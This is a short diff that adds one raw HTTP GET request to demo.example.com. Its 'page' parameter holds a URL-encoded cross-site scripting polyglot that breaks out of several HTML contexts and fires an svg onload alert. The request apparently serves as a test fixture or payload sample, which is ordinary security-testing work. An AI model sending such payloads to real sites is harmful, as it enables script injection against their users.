@@ -1,0 +1,4 @@
+GET /a?page=javascript%3A%2F%2A--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Bonload%3Dalert%281%29%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
